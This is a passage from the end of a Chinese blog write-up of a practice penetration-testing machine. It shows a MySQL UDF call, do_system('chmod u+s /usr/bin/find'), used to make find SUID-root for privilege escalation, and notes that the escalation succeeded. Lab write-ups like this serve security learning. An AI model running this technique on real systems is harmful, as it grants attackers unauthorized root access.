+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">|                                    0 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>此时相当于以root权限执行了<code>chmod u+s /usr/bin/find</code> 命令，所以我们可以利用find来提权了</p>
+<p><img src="https://yk.jsdu.cn/20260227/927885697bd9457a5b1120cce02f8c1d.png" alt="raven8"></p>
+<p>可以发现提权成功。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA/" rel="tag"># 渗透靶机</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/23/Lampiao/" rel="prev" title="Lampiao">
+                  <i class="fa fa-angle-left"></i> Lampiao
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">My0n9s</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
